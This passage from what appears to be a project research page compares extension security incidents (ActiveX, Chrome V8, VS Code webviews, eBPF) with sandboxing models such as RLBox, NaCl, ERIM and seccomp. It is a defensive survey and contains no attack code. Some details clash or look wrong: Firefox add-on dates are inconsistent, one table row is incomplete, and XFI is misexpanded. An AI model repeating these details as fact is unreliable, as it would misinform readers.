interfaces can be a direct vector for attackers.</p> </li> <li> <p>Mitigation with EIM: An EIM would enforce memory safety for extensions \u2013 for instance, by requiring extensions to run in a memory-safe sandbox or language. Buffer overflow exploits as seen in ActiveX would be prevented at the root: the extension code either couldn\u2019t allocate arbitrary memory or would be confined to a sandbox that traps on overflow. For example, EIM might mandate bounds-checked memory access (as WebAssembly does) so an overflow would not corrupt the host\u2019s memory (Security - WebAssembly) (Security - WebAssembly). In the ActiveX case, EIM could have required the control to run in a restricted environment with no direct pointer access, averting arbitrary code execution.</p> </li> </ul>"},{"location":"bpftime/EIM/study/compare/#12-sandbox-escape-incidents","title":"1.2 Sandbox Escape Incidents","text":"<ul> <li> <p>Browser Sandboxes (Chrome V8): Modern browsers isolate extension or webpage code in sandboxed processes. However, sandbox escape vulnerabilities still occur when the isolation is not airtight. A recent Chrome zero-day (CVE-2024-4761) was a V8 engine out-of-bounds write bug that allowed code running in a Chrome renderer process to break out of the sandbox and execute with higher privileges (Dangerous Google Chrome Zero-Day Allows Sandbox Escape). In this case, an attacker first exploits a memory bug in the extension/webpage context, then uses it to escape the sandbox (pivoting from the confined renderer process to the broader system). This kind of two-step exploit (renderer compromise \u2192 sandbox escape) is common in Chrome attack chains (WebAssembly and Back Again: Fine-Grained Sandboxing in Firefox 95 \u2013 Attack &amp; Defense) (WebAssembly and Back Again: Fine-Grained Sandboxing in Firefox 95 \u2013 Attack &amp; Defense).</p> </li> <li> <p>DevTools Extension Escape: In one reported case, a vulnerability in Chrome\u2019s DevTools and extension interaction (CVE-2024-5836) allowed an installed extension to escape Chrome\u2019s sandbox by opening a crafted link (Escaping the Chrome Sandbox Through DevTools - ading2210). Similarly, Firefox\u2019s content sandbox has been bypassed in the past by chaining browser engine bugs with extension capabilities.</p> </li> <li> <p>VS Code Extensions (Webview Escape): Extensions are not limited to browsers. In 2022, VS Code (which allows third-party extensions) had a misconfiguration in how extension Webviews were sandboxed. One extension\u2019s XSS bug allowed malicious HTML to break out of the Webview sandbox and execute code in the extension\u2019s context (Escaping misconfigured VSCode extensions - The Trail of Bits Blog) (Escaping misconfigured VSCode extensions - The Trail of Bits Blog). Because VS Code extensions run with the user\u2019s full privileges (able to read files and run shell commands (Escaping misconfigured VSCode extensions - The Trail of Bits Blog)), this meant an attacker controlling a Webview could potentially steal local files (even SSH keys) or run arbitrary commands by exploiting the extension vulnerability (Escaping misconfigured VSCode extensions - The Trail of Bits Blog).</p> </li> <li> <p>Mitigation with EIM: EIM would maintain a robust sandbox barrier around extension code. In the Chrome V8 case, EIM could have added an extra layer of isolation \u2013 for example, running extension code in a memory-safe intermediate representation (like WASM) with explicit bounds checks, so even a V8 bug couldn\u2019t directly breach the process\u2019s memory. EIM might also employ multiple enforcement layers (language safety, process isolation, and OS-level sandboxing) so that a single engine flaw is not enough to escape. In the VS Code scenario, EIM could ensure that even if an extension\u2019s UI (Webview) is compromised, the core extension logic is running with least privilege \u2013 e.g., file system access only via vetted APIs, preventing an easy jump from a UI XSS to full file access. Additionally, EIM could require that extensions which render untrusted content (like the Webview) run in a separate, locked-down process or sandbox compartment, making it far harder for a Webview exploit to impact the host system.</p> </li> </ul>"},{"location":"bpftime/EIM/study/compare/#13-privilege-escalation-through-extensions","title":"1.3 Privilege Escalation through Extensions","text":"<ul> <li> <p>Legacy Firefox Extensions (Full Privileges): Firefox\u2019s old XUL extension framework (pre-2017) granted installed add-ons unrestricted privileges in the browser process \u2013 they could read/write files, execute programs, etc. (). This meant any vulnerability in an extension\u2019s script (or a malicious extension) could escalate to full host privileges. Attackers demonstrated this at DEFCON 2009 by exploiting popular Firefox add-ons to execute native code and install malware (). Essentially, Firefox\u2019s extensions acted with the user\u2019s authority without isolation \u2013 a design now recognized as highly insecure.</p> </li> <li> <p>Chrome Extension Vulnerabilities: Chrome\u2019s extension model is more restrictive, but over-privileged extensions or logic flaws can still lead to escalation. A notable incident was the AVG \u201cWeb TuneUp\u201d Chrome extension (installed by an antivirus program) which had multiple critical bugs. It injected insecure scripts into web pages and exposed APIs such that any website could steal browsing history and cookies, or even inject arbitrary scripts into all pages the user visited (Google probes AVG Chrome widget after 9m users exposed by bugs \u2022 The Register) (Google probes AVG Chrome widget after 9m users exposed by bugs \u2022 The Register). Essentially, a malicious webpage could escalate its privileges by leveraging this overly-powerful extension (gaining access to other sites like the user\u2019s email).</p> </li> <li> <p>Kernel Extensions (eBPF): At the OS level, eBPF provides a way to load extensions into the Linux kernel (for networking, tracing, etc.) with supposed safety checks. But flaws in the eBPF verifier have led to privilege escalations \u2013 letting an unprivileged user gain kernel (root) execution. For example, CVE-2023-2163 (a bug in Linux eBPF) was shown to allow a \u201csmall bug to compromise the entire system\u201d (Understanding the Security Aspects of Linux eBPF - Pentera). In general, eBPF bugs that bypass its checks give an attacker a path to run arbitrary code in the kernel, a severe privilege escalation (Understanding the Security Aspects of Linux eBPF - Pentera).</p> </li> <li> <p>Mitigation with EIM: EIM is designed around the principle of least privilege. In a browser context, EIM would require that extensions declare and be limited to the minimal permissions they need \u2013 similar to Chrome\u2019s Manifest V3 approach, but potentially even more fine-grained and enforced by the runtime. For instance, an EIM-governed browser extension couldn\u2019t arbitrarily inject scripts into every page or read all browsing data unless explicitly allowed, which would have contained the AVG extension\u2019s impact. (Chrome\u2019s newer model in fact blocks remote code and excessive privileges (Stay secure \u00a0|\u00a0 Chrome Extensions \u00a0|\u00a0 Chrome for Developers) (Stay secure \u00a0|\u00a0 Chrome Extensions \u00a0|\u00a0 Chrome for Developers), aligning with what EIM would enforce.) In the case of kernel extensions like eBPF, EIM would add defense-in-depth: even if the verifier has a bug, the extension code might still be running in a secondary sandbox or constrained environment (e.g., user-space eBPF JIT with hardware keys isolation) to prevent total kernel compromise. In short, EIM would assume any single layer can fail, and thus use layered isolation and strict privilege gating to avert escalation.</p> </li> </ul>"},{"location":"bpftime/EIM/study/compare/#14-comparative-table-incidents-vs-eim-mitigations","title":"1.4 Comparative Table: Incidents vs. EIM Mitigations","text":"Security Failure (Extension) Root Cause Impact How EIM Could Mitigate ActiveX buffer overflow (IE, 2003) ([Microsoft Security Bulletin MS03-042 - Critical Microsoft Learn](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2003/ms03-042#:~:text=A%20security%20vulnerability%20exists%20in,The%20Microsoft)) Native extension with no memory safety; marked \u201csafe for scripting\u201d Remote code execution on host via overflow exploit Firefox XUL Add-ons (pre-2011) () Extensions had full OS/browser privileges (no isolation or permission model) Extension malware or exploited bug can control browser and OS files Least privilege enforcement: EIM mandates that extensions get only minimal permissions (e.g. no file access unless needed). Host APIs are gated, so even a compromised extension can\u2019t exceed its small allowance. Chrome extension (AVG Web TuneUp) (2015) (Google probes AVG Chrome widget after 9m users exposed by bugs \u2022 The Register) Overly broad privileges and insecure API injection by extension Any website could hijack user sessions, steal data, run scripts via the extension Privilege partitioning: Under EIM, such an extension would be confined to specific contexts. EIM\u2019s policy would prevent an extension from exposing dangerous APIs to untrusted web content, and limit its access to sensitive data by default. Chrome V8 sandbox escape (CVE-2024-4761) (Dangerous Google Chrome Zero-Day Allows Sandbox Escape) Memory error in extension/web content engine + single-process sandbox design Sandboxed code escapes to execute with browser or OS privileges (potential full compromise) Strong multi-layer sandbox: EIM would use layered isolation (e.g. in-process SFI and OS process isolation). A memory bug wouldn\u2019t immediately allow escape because the extension code might be further constrained by EIM\u2019s runtime checks (e.g. no arbitrary jumps, as in WASM (Security - WebAssembly)). Even if one layer is breached, another stops the attacker. Linux eBPF exploit (kernel ext, 2022) (Understanding the Security Aspects of Linux eBPF - Pentera) Bug in verifier of allowed extension code (insufficient control) Local priv. escalation \u2013 unprivileged user executes code in kernel Rigorous verification &amp; isolation: EIM would supplement kernel verifier with formal proofs or run extension in user-space with limited kernel hooks. Even if extension code has a bug, it can\u2019t directly write to arbitrary kernel memory. EIM could, for example, run eBPF programs in a user-space sandbox and only allow safe interactions with kernel, preventing a runaway exploit. <p>Sources: The above incidents draw from documented vulnerabilities and reports (Microsoft Security Bulletin MS03-042 - Critical | Microsoft Learn) (Google probes AVG Chrome widget after 9m users exposed by bugs \u2022 The Register) (Dangerous Google Chrome Zero-Day Allows Sandbox Escape) (Understanding the Security Aspects of Linux eBPF - Pentera) (). They illustrate recurring weaknesses when extension models lack strong isolation. EIM\u2019s approach \u2013 combining memory safety, strict sandboxing, and least-privilege policies \u2013 directly addresses these weaknesses by design.</p>"},{"location":"bpftime/EIM/study/compare/#2-similar-sandboxing-and-privilege-reduction-approaches-beyond-ebpf-wasm","title":"2. Similar Sandboxing and Privilege-Reduction Approaches (Beyond eBPF &amp; WASM)","text":"<p>To better understand EIM in context, we compare it to existing technologies aimed at securely running extension or plug-in code. Two prominent modern examples are eBPF (for kernel extensions) and WebAssembly (WASM) (for safe web/app modules), which both strive to execute untrusted code safely. EIM shares goals with these but also with a number of other approaches. Below we examine similar models \u2013 RLBox, NaCl, ERIM, and more \u2013 highlighting their security benefits and performance trade-offs, and comparing them to what EIM promises.</p>"},{"location":"bpftime/EIM/study/compare/#21-rlbox-fine-grained-in-process-sandboxing","title":"2.1 RLBox \u2013 Fine-Grained In-Process Sandboxing","text":"<p>RLBox is a framework (used in Firefox) that isolates third-party libraries by compiling them to WebAssembly and then back to native code, creating an in-process sandbox (WebAssembly and Back Again: Fine-Grained Sandboxing in Firefox 95 \u2013 Attack &amp; Defense) (WebAssembly and Back Again: Fine-Grained Sandboxing in Firefox 95 \u2013 Attack &amp; Defense). The sandboxed code cannot jump to arbitrary addresses in the host application or access memory outside its assigned region (WebAssembly and Back Again: Fine-Grained Sandboxing in Firefox 95 \u2013 Attack &amp; Defense). This effectively enforces software-based fault isolation (SFI) within the same process. </p> <ul> <li> <p>Security: By restricting control flow and memory range, RLBox contains any memory corruption within the sandboxed library, preventing it from hijacking the host application. Even if a vulnerability exists in, say, an image decoding library, an attacker can\u2019t use it to execute code in the browser\u2019s context \u2013 they\u2019d be trapped in the WebAssembly sandbox. Mozilla noted that a zero-day in an isolated library should pose \u201cno threat to Firefox\u201d \u2013 researchers would be rewarded for a sandbox bypass rather than a library exploit (WebAssembly and Back Again: Fine-Grained Sandboxing in Firefox 95 \u2013 Attack &amp; Defense). This layered approach (library isolation on top of process sandboxing) greatly hardens security.</p> </li> <li> <p>Performance: A key advantage of RLBox is low overhead. Because the sandboxed code runs in the same process (just with checks on calls and memory), it avoids expensive context switches into a separate process. The designers report modest, transient overhead \u2013 only minor page load latency impacts even when sandboxing performance-sensitive libraries like image and video decoders (Retrofitting Fine Grain Isolation in the Firefox Renderer | USENIX) (Retrofitting Fine Grain Isolation in the Firefox Renderer | USENIX). Techniques like ahead-of-time WASM compilation and even cross-boundary inlining are used to optimize performance (WebAssembly and Back Again: Fine-Grained Sandboxing in Firefox 95 \u2013 Attack &amp; Defense). Thus, RLBox achieves strong isolation with minimal slowdown (on the order of a few percent overhead in Firefox\u2019s real-world usage).</p> </li> <li> <p>Flexibility: RLBox can be incrementally applied to individual components without a full app rewrite. It integrates via a tainting API in C++ to ensure all data coming out of the sandbox is checked or copied safely (WebAssembly and Back Again: Fine-Grained Sandboxing in Firefox 95 \u2013 Attack &amp; Defense). However, it\u2019s currently specialized for isolating known subcomponents (not arbitrary user-installed extensions). EIM could be seen as a generalized version of this concept, potentially allowing any extension code to be isolated similarly. Where RLBox requires the host developer to decide which library to sandbox, EIM might automatically sandbox all third-party extension code by default.</p> </li> </ul> <p>Comparison to EIM: EIM and RLBox share the idea of in-process isolation. If EIM uses a WebAssembly or SFI-based sandbox for extensions, it would be analogous to how RLBox sandboxes libraries. Both aim for security with low overhead. The difference is scope: RLBox is a targeted mechanism (Firefox uses it for specific libraries like Graphite, Hunspell, etc.), whereas EIM is envisioned as a universal model for extensions. EIM might generalize RLBox\u2019s approach to any plugin or extension code, providing a framework to confine that code similarly (with control-flow integrity and memory safety checks). In terms of performance and flexibility, EIM would strive for RLBox\u2019s lightweight overhead, but with a system that extension developers can plug into without needing deep browser integration code \u2013 effectively making safe extension isolation a built-in feature.</p>"},{"location":"bpftime/EIM/study/compare/#22-google-native-client-nacl-and-portable-nacl-pnacl","title":"2.2 Google Native Client (NaCl) and Portable NaCl (PNaCl)","text":"<p>Native Client (NaCl) was Google\u2019s pioneering sandbox for running native code (C/C++ compiled) in the browser. It used static analysis and sandboxing to allow modules of x86 or ARM machine code to run at near-native speed, but constrained by a verifier to prevent unsafe operations (Google Native Client - Wikipedia). NaCl essentially applied software fault isolation at the binary level: it validated instruction sequences (e.g., ensuring no jump could exit a sandboxed memory region, no system calls executed directly, etc.), and executed the code in a restricted process. PNaCl later introduced a portable bitcode format (LLVM IR) to allow architecture-independent binaries (Google Native Client - Wikipedia).</p> <ul> <li> <p>Security: NaCl\u2019s security model was much stricter than earlier native extension tech like ActiveX. The Wikipedia summary notes that ActiveX had full access to the system, whereas Native Client avoids this issue by using sandboxing (Google Native Client - Wikipedia). The NaCl sandbox had granular control: it restricted memory accesses (segmenting memory so the code can\u2019t touch the browser\u2019s memory) and required all system interactions to go through a broker (the Pepper API). This meant even if a NaCl module had a buffer overflow, at worst it could crash or misbehave inside the sandbox; it shouldn\u2019t execute arbitrary OS calls or read/write outside its sandbox memory. NaCl successfully blocked many traditional exploits by design.</p> </li> <li> <p>Performance: A major goal of NaCl was speed \u2013 achieving near-native execution. In practice, NaCl introduced some overhead due to alignment rules and guard instructions, but it was quite efficient (reports indicated within ~5% of native performance for computation-heavy code) ([PDF] Native Client: A Sandbox for Portable, Untrusted x86 Native Code). It leveraged the CPU\u2019s hardware features (segmentation on x86, for example) to enforce memory confines cheaply. PNaCl added a translation step but still focused on efficiency. The trade-off was the complexity of the compiler and verification toolchain, not so much runtime speed.</p> </li> <li> <p>Flexibility: NaCl required extensions to be specifically compiled for it, and developers had to use Chrome\u2019s Pepper APIs for any interaction (like graphics, input, networking). This was a hurdle; it wasn\u2019t just arbitrary native code \u2013 it had to be adapted. Ultimately, NaCl fell out of favor as WebAssembly emerged, because WASM provided similar speed and safety but with a more standard Web platform approach. NaCl also was Chrome-specific. </p> </li> </ul> <p>Comparison to EIM: EIM could be thought of as a successor in spirit to NaCl, but more universal. Where NaCl focused on browser plugins, EIM might apply to any software extension (browser, app, OS module) using modern techniques. EIM would likely not require a custom CPU-specific sandbox like NaCl did, but could leverage WebAssembly or hardware features (like MPK, see below) to isolate code. In terms of effectiveness, NaCl proved it\u2019s possible to run native-speed code safely \u2013 EIM would aim for the same, using updated technology. For flexibility, EIM might prefer WebAssembly as the input (since any language can compile to WASM), rather than native ISA binaries, to avoid the portability issues NaCl had. The performance of EIM could be comparable to NaCl or better if using hardware support; the overhead should be low enough for real-time use (NaCl\u2019s near-native performance is a benchmark to meet). In summary, EIM can be seen as adopting NaCl\u2019s sandboxing rigor (no uncontrolled syscalls or memory access) but with more openness (not tied to Chrome only) and ease of use (leveraging standards and possibly dynamic translation for extensions). </p>"},{"location":"bpftime/EIM/study/compare/#23-erim-in-process-isolation-with-memory-protection-keys","title":"2.3 ERIM \u2013 In-Process Isolation with Memory Protection Keys","text":"<p>ERIM (Secure, Efficient In-process Isolation with Protection Keys) is a research project that isolates components within a single process using Intel\u2019s Memory Protection Keys (MPK) hardware feature (ERIM: Secure, Efficient In-process Isolation with Protection Keys (MPK) | USENIX). The key idea is to split the address space into domains (e.g., \u201ctrusted\u201d and \u201cuntrusted\u201d parts) and use CPU-enforced keys to restrict memory access when switching between domains, without going to the kernel for context switch. ERIM also uses a binary inspector to ensure untrusted code can\u2019t circumvent the restrictions (e.g., by issuing an MPK reconfiguration) (ERIM: Secure, Efficient In-process Isolation with Protection Keys (MPK) | USENIX).</p> <ul> <li> <p>Security: ERIM provides hardware-backed memory isolation. For example, an extension (untrusted module) could be in one domain and the host in another. When the extension runs, it cannot read or write the host\u2019s memory (the hardware will block it if it tries), and vice versa. This is somewhat similar to SFI, but enforced by the CPU\u2019s memory management unit rather than instruction-level instrumentation. By inspecting the binary, ERIM ensures the untrusted module doesn\u2019t contain forbidden instructions that could disable the protection keys. This means even a memory corruption in the extension can\u2019t break into the host memory \u2013 it would hit a wall enforced at hardware speed. It\u2019s a strong safety property, though currently it primarily protects memory (control-flow isolation still relies on not jumping into the middle of host code, which binary inspection also guards).</p> </li> <li> <p>Performance: ERIM\u2019s big advantage is very low overhead context switching. Switching protection domains is done entirely in userspace by updating a thread-local protection key register, which is extremely fast (much faster than a full process context switch or even a syscall). The authors measured &lt;1% overhead for as many as 100,000 domain switches per second (ERIM: Secure, Efficient In-process Isolation with Protection Keys (MPK) | USENIX) \u2013 essentially negligible performance cost for most applications. This makes ERIM attractive for fine-grained isolation (you could call into untrusted code frequently without a big slowdown). Traditional process isolation, by contrast, would choke on 100k context switches/sec. ERIM does have some fixed overhead in memory usage (each domain needs separate memory regions) and requires CPU support (Intel MPK available on relatively recent CPUs).</p> </li> <li> <p>Flexibility: ERIM doesn\u2019t require special compilers or languages; it works at binary level with some constraints. It can be applied to existing applications with some modifications to designate isolated modules and replace unsafe instructions. However, it\u2019s currently x86-specific (MPK). For extension systems, using ERIM would mean the host application and extension run in one process but different memory domains. That\u2019s feasible for things like plugin architectures or even browser extensions, provided the runtime can manage the domains. One limitation: all code is still in one process space, so OS-level privileges are the same (if the process is compromised in another way, OS still sees it as one process). But the internal isolation is strong.</p> </li> </ul> <p>Comparison to EIM: If EIM is implemented at a low level, it could leverage technologies like ERIM. For instance, EIM could say: \u201cWhen an extension is loaded, it will be placed in an MPK-isolated domain separate from the host.\u201d This would give EIM hardware-enforced safety with minimal overhead \u2013 aligning with the goal of not sacrificing performance for security. Effectiveness-wise, ERIM\u2019s approach means even high-frequency interactions between extension and host are safe and fast. EIM can combine this with other measures: memory keys protect memory, but EIM might also impose system call filters or permission checks (ERIM doesn\u2019t inherently limit syscalls from the isolated code \u2013 that would need seccomp or other measures in tandem). So EIM could use ERIM for memory isolation and an API call monitor for controlling what the extension can do (thus covering both memory safety and privilege limitation). In terms of flexibility, ERIM shows it\u2019s possible to isolate components without rewriting them in a new language \u2013 an extension in native code could be isolated if the platform enforces it with MPK. EIM might abstract that complexity away so extension developers don\u2019t need to know about MPK \u2013 it just happens under the hood. The overhead of EIM in such a case would be similar to ERIM\u2019s (&lt;1%), making it extremely appealing: strong isolation with essentially no user-visible performance impact (ERIM: Secure, Efficient In-process Isolation with Protection Keys (MPK) | USENIX). The main trade-off is the requirement of specific hardware features (on CPUs that support it). EIM might need to fall back to software isolation on other platforms (like using SFI/WASM on ARM where MPK is not available). </p>"},{"location":"bpftime/EIM/study/compare/#24-other-sandbox-and-privilege-reduction-techniques","title":"2.4 Other Sandbox and Privilege-Reduction Techniques","text":"<p>Beyond the three highlighted, there are other notable approaches that aim to securely run untrusted extensions or reduce their privileges:</p> <ul> <li> <p>Language-Based Isolation: Some systems choose a safe language for extensions. For example, browser extensions in Chrome/Firefox are written in JavaScript/TypeScript (memory-safe languages) rather than C++, which inherently avoids buffer overflow issues. Similarly, sandboxing via type safety is used in systems like the JVM or .NET CLR for plugins. The upside is safety is ensured by the language runtime (no arbitrary pointer manipulation); the downside is that logic errors or abuses of provided APIs can still cause harm. EIM could incorporate this by requiring extensions to be written in or compiled to a memory-safe language (like WASM, which is designed to be memory-safe and sandboxed). Memory-safe languages alone don\u2019t enforce least privilege, so additional measures are needed for full security.</p> </li> <li> <p>Process Sandboxing and OS Isolation: Chrome\u2019s multi-process architecture is a prime example \u2013 each web site and extension can run in a separate OS process under a restrictive sandbox (using job objects on Windows, seccomp-bpf on Linux, etc.). This greatly limits the damage if one component is compromised. The cost is higher memory usage and some performance overhead in cross-process communication. Another example is hardware virtualization or containers: An extreme but secure route is to run extensions in lightweight VMs or containers (like how some IDEs run plugins in separate containerized processes). This provides strong isolation (almost like a separate machine for the extension), but can be heavyweight. EIM would seek a middle ground: achieve process-like isolation strength at much lower cost (similar to how RLBox/ERIM do within one process). However, EIM can still leverage OS features \u2013 for instance, using separate processes for extensions where appropriate, combined with OS sandboxing (Seccomp, discussed later) to confine them. The model should be flexible: if an extension is large or untrusted, the system might decide to fork it out as a process under strict controls; if it\u2019s small, maybe an in-process sandbox suffices. EIM\u2019s framework could orchestrate this decision transparently.</p> </li> <li> <p>Software Fault Isolation (SFI): This is a classic technique underlying several of the above (NaCl, RLBox). Pure SFI (as in the research by Wahbe et al.) inserts checks around memory accesses and jumps in the untrusted code to ensure it stays in its sandbox. Modern incarnations like WebAssembly implement SFI at the bytecode level (with structured control flow and explicit bounds checks) (Security - WebAssembly) (Security - WebAssembly). Another system, XFI (eXtensible Firmware Interface\u2019s policy or eXecutable-only memory enforcement), was a research prototype that added inline reference monitors for security-critical operations. The trade-off for SFI is typically some performance cost (due to added checks) but no need for special hardware. For example, WebAssembly adds bounds-checking on every memory access (unless mitigated by techniques like hardware memory tagging in the future). This can be a few percent overhead in execution speed, but generally acceptable for the safety gained. EIM could use SFI (via WebAssembly or a similar bytecode) as a universal approach since it\u2019s hardware-agnostic. The overhead is usually lower than heavy virtualization but higher than hardware MPK (since MPK has near-zero overhead). Combining SFI with JIT/AOT optimization and other tricks (as Firefox does with wasm2c in RLBox (WebAssembly and Back Again: Fine-Grained Sandboxing in Firefox 95 \u2013 Attack &amp; Defense)) can reduce the performance hit significantly. </p> </li> <li> <p>Native OS Sandboxing APIs: There are also OS-level frameworks like Windows AppContainer or Android\u2019s isolated processes for apps, which could be analogized to extensions. For instance, a browser extension in Edge could run as a UWP AppContainer with a capability list. These limit accessible resources but are not commonly used for browser add-ons yet. EIM could potentially leverage such OS features when available (running each extension as a locked-down OS-level app). However, doing so for each small extension might be too heavy, which is why EIM would likely combine processes for coarse isolation and in-process sandboxing for fine-grained safety.</p> </li> </ul> <p>Summary of Trade-offs: All these approaches attempt to balance security vs. performance vs. flexibility:</p> <ul> <li>Approaches like separate processes or VMs give strong security (clear isolation boundaries) but with higher overhead (context switching, memory) and complexity (communication between host and extension).</li> <li>Approaches like in-process SFI or MPK (RLBox, ERIM) give fine-grained security with low overhead, but require careful design to ensure completeness of isolation (need to prevent any \u201cbackdoors\u201d like stray function pointers or CPU instructions that break out).</li> <li>Language-based safety removes whole classes of bugs (like buffer overruns) but doesn\u2019t inherently sandbox the code\u2019s behavior (it could still call unsafe host APIs if allowed). </li> </ul> <p>EIM\u2019s Position: The Extension Isolation Mechanism would likely combine these techniques to get the best of each. It might use language-based SFI (WASM) as a baseline so extensions can\u2019t mismanage memory, use OS sandboxing as a guardrail (each extension might be in a process or at least subject to OS syscall filters), and possibly exploit hardware features like MPK when available to reduce overhead. In terms of effectiveness, EIM aims to match or exceed the security of these models \u2013 meaning an extension under EIM should be at least as contained as under NaCl or RLBox. In terms of flexibility, EIM should allow a wide range of extension logic (not just specific libraries or code compiled in special ways) \u2013 more like how WebAssembly can accept many languages. And regarding overhead, EIM aspires to be lightweight enough that users don\u2019t notice a performance difference, comparable to RLBox\u2019s and ERIM\u2019s sub-5% overhead or NaCl\u2019s near-native speed (Retrofitting Fine Grain Isolation in the Firefox Renderer | USENIX) (ERIM: Secure, Efficient In-process Isolation with Protection Keys (MPK) | USENIX).</p>"},{"location":"bpftime/EIM/study/compare/#3-prior-art-and-literature-on-extension-security-models","title":"3. Prior Art and Literature on Extension Security Models","text":"<p>Securing extension systems has been a focus of both academic research and industry engineering for over a decade. Here we review some key prior art \u2013 including browser extension least-privilege frameworks and OS-level security models \u2013 and compare them to EIM. The goal is to see how EIM aligns with the principle of least privilege, and how it addresses gaps not fully solved by earlier models. We also provide references from papers and reports to contextualize EIM among existing security frameworks.</p>"},{"location":"bpftime/EIM/study/compare/#31-least-privilege-in-browser-extensions-chrome-manifest-v3-firefox-webextensions","title":"3.1 Least Privilege in Browser Extensions (Chrome Manifest v3, Firefox WebExtensions)","text":"<p>Browser vendors have learned the hard way that extensions must be restricted. Early Firefox extensions were essentially unrestricted chrome code running in the browser process (), which, as discussed, led to multiple security issues. The principle of least privilege says an extension should only have the permissions absolutely necessary for its function \u2013 nothing more \u2013 so that even if it is malicious or exploited, the damage is limited.</p> <ul> <li> <p>Firefox\u2019s evolution: Research by Adrienne Porter Felt in 2010 showed that 88% of studied Firefox add-ons didn\u2019t need the powerful privileges they were given (). Many add-ons could work with far fewer rights if the system allowed it. This study directly influenced extension reform. Firefox eventually moved to the WebExtensions model (around 2017), aligning with Chrome\u2019s model. Under WebExtensions, Firefox extensions are written in JS and have a defined set of APIs and permission prompts, rather than unlimited XPCOM access. This significantly improved the security posture by removing the old XUL add-ons\u2019 capability to, say, delete arbitrary files or launch processes unless explicitly allowed by a specific API.</p> </li> <li> <p>Chrome\u2019s extension model: From its inception, Chrome designed extensions with a permission system and sandboxing. Each extension runs in a separate process (or several processes for background and content scripts) with restricted privileges. Extensions must declare in their manifest which host permissions (which websites) and which special APIs (e.g. tabs, storage, etc.) they need. The user has to approve these at install time. Chrome\u2019s Manifest V3, introduced recently, tightens this further. It forbids remotely hosted code and disallows <code>eval()</code> or new script generation by extensions (Improve extension security \u00a0|\u00a0 Chrome Extensions \u00a0|\u00a0 Chrome for Developers) (Improve extension security \u00a0|\u00a0 Chrome Extensions \u00a0|\u00a0 Chrome for Developers). All extension code must be included in the extension package and go through Chrome\u2019s review (for store extensions). This prevents a huge class of attacks where an extension might fetch and execute unknown code at runtime. Manifest V3 also enforces more granular host permissions: an extension can prompt the user at runtime for access to a site, rather than grabbing blanket access to \u201c\u201d. Chrome explicitly encourages developers to request minimal permissions in the manifest (Stay secure \u00a0|\u00a0 Chrome Extensions \u00a0|\u00a0 Chrome for Developers), noting that limiting privileges also limits what an attacker can do if the extension is compromised (Stay secure \u00a0|\u00a0 Chrome Extensions \u00a0|\u00a0 Chrome for Developers) (Stay secure \u00a0|\u00a0 Chrome Extensions \u00a0|\u00a0 Chrome for Developers).  <li> <p>Examples of least privilege: In practice, if an extension only needs to manipulate data on example.com, it should not ask for access to every site. Chrome\u2019s model makes this possible (fine-grained host permissions). Firefox\u2019s WebExtensions follow a similar approach; the same extension manifest can specify permissions and will be honored by Firefox. Additionally, both browsers now mandate that extensions be distributed with a digital signature (for integrity) and can be automatically disabled if malware is detected in them via updates. While signature is not \u201cleast privilege\u201d per se, it complements the security model by ensuring only reviewed code runs.</p> </li> <p>How EIM Compares: EIM would incorporate these least-privilege principles at its core. In fact, one can think of EIM as an generalized least-privilege framework not just for browser extensions, but for extensions in any software. The way Chrome Manifest v3 limits capabilities of extensions is very much in spirit of EIM. EIM would likely provide a declarative manifest of capabilities for any extension: for example, a Photoshop plugin under EIM might declare it needs \u201copen/save image file access\u201d and nothing else \u2013 EIM would then enforce that (the plugin couldn\u2019t suddenly access the network or registry). This is analogous to how Capsicum works at the OS level (more on Capsicum below) but applied at the application extension level.</p> <p>Where current browser models focus mostly on permissions to Web APIs and sites, EIM could broaden the concept: it might include resource sandboxing (files, network, devices) for all extensions. Also, EIM would integrate with the sandboxing of extension code execution. Chrome and Firefox mainly ensure least privilege by controlling API access but rely on the browser\u2019s existing sandbox to isolate extension processes. EIM would unify these \u2013 an extension under EIM gets both a confined execution environment (like a sandboxed process or SFI module) and a restricted set of privileges. The combination means even if the extension tries to step out of line, it\u2019s constrained on multiple levels.</p> <p>In summary, EIM extends the browser least-privilege concept to a universal model: each extension declares capabilities, which EIM strictly enforces, and any action outside those capabilities is blocked (or requires user consent). This addresses a gap in many current systems where enforcement might be ad-hoc or not available for all extension types. EIM\u2019s systematic approach ensures no extension is trusted by default \u2013 everything is deny-by-default, allow-by-policy, which is the essence of least privilege.</p>"},{"location":"bpftime/EIM/study/compare/#32-os-level-security-models-capsicum-seccomp-and-others","title":"3.2 OS-Level Security Models: Capsicum, Seccomp, and Others","text":"<p>The operating system provides mechanisms to confine applications, which can be repurposed to confine extensions running within applications. Two notable models are Capsicum (capability-based security in FreeBSD) and seccomp (secure computing mode in Linux). They represent the state-of-the-art in sandboxing at the OS level, and EIM\u2019s design can learn from them or even utilize them.</p> <ul> <li> <p>Capsicum (FreeBSD Capabilities): Capsicum is a lightweight OS capability and sandbox framework that brings fine-grained capabilities to Unix (A Taste of Capsicum \u2013 Communications of the ACM). In Capsicum, a process can enter a capability mode where it can no longer access global namespaces (like opening any arbitrary file by path). Instead, it can only operate on already-opened file descriptors (which are like capabilities, with specific rights). For example, a Capsicumized application might open a needed file or socket, then drop into capability mode, and from then on it cannot open any new files that weren\u2019t pre-opened \u2013 if it tries, the OS will deny it. This implements the least privilege principle: the app has exactly the set of resources it needs and nothing more ([PDF] The Capsicum Security Framework: Sandboxing Done the Right Way). Capsicum was used to compartmentalize parts of Chromium and some Unix utilities to prove its viability (A Taste of Capsicum \u2013 Communications of the ACM). It basically requires some modification to applications, but it provides a strong partition: even if an attacker takes control of a Capsicum-contained process, they cannot directly open new files or network connections to escalate further; they\u2019re trapped with the file descriptors they have.</p> </li> <li> <p>seccomp (Linux Seccomp-bpf): Seccomp started as a way to reduce Linux kernel attack surface by restricting syscalls. In its strict mode, a process could be limited to only <code>read</code>, <code>write</code>, <code>_exit</code>, and <code>sigreturn</code> syscalls \u2013 effectively nothing but basic I/O (Seccomp and sandboxing [LWN.net]). Later, seccomp was extended with a configurable filter (seccomp-bpf) so you can choose exactly which syscalls (and even which arguments) to allow or deny. Chrome uses seccomp-bpf on Linux to sandbox its renderer and extension processes, disallowing risky syscalls (like those that open files, create sockets, etc., which renderer code should never need) (Seccomp and sandboxing [LWN.net]). The idea is similar to Capsicum: drop anything not needed. A process running under seccomp with a tight filter is in a strict sandbox \u2013 even if compromised, when it tries to make a forbidden syscall (for example, attempt to execve a new process or open <code>/etc/passwd</code>), the kernel will kill the process or deny the call. Seccomp is very low-overhead (it\u2019s just a check in the syscall path) and flexible, but it 